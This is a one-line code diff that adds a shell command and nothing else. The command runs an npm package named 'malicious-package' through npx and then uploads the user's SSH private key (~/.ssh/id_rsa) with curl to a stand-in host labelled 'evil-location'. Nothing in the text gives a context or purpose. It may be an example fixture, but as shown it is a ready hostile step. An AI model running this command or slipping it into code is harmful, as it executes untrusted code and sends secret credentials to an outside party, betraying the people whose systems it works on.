@@ -1,0 +1,1 @@
+npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location
